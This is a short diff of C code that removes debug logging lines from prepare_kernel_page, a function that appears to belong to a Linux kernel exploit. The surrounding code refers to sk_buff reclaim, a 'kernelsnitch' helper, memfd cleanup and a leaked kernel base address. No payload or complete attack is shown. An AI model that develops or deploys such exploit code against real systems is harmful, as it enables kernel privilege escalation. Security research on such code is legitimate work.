@@ -1406,16 +1406,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
           reclaim_sent, reclaim_sends, payload_mode);
 #endif
-  pr_info("kernel page post-reclaim ksnitch-cleanup begin mode=%d\n",
-          payload_mode);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("kernel page cleanup stage=kernelsnitch begin mode=%d base=%016zx\n",
           payload_mode, base);
 #endif
   kernelsnitch_cleanup(ks);
   ks = NULL;
-  pr_info("kernel page post-reclaim ksnitch-cleanup done mode=%d\n",
-          payload_mode);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("kernel page cleanup stage=kernelsnitch done mode=%d\n",
           payload_mode);
@@ -1423,8 +1419,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pr_info("kernel page cleanup stage=prepare-children begin count=%zu\n",
           prepare_ctx.mm_cnt);
 #endif
-  pr_info("kernel page post-reclaim children begin count=%zu mode=%d\n",
-          prepare_ctx.mm_cnt, payload_mode);
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     if (prepare_ctx.memfds[i] >= 0) {
       SYSCHK(close(prepare_ctx.memfds[i]));
@@ -1441,18 +1435,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
               i + 1, prepare_ctx.mm_cnt);
     }
 #endif
-    if ((i + 1) % 128 == 0 || i + 1 == prepare_ctx.mm_cnt) {
-      pr_info("kernel page post-reclaim children progress=%zu/%zu mode=%d\n",
-              i + 1, prepare_ctx.mm_cnt, payload_mode);
-    }
   }
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("kernel page cleanup stage=prepare-children done base=%016zx\n",
           base);
 #endif
 
-  pr_info("kernel page prepare success base=%016zx mode=%d\n", base,
-          payload_mode);
   return base;
 }
 
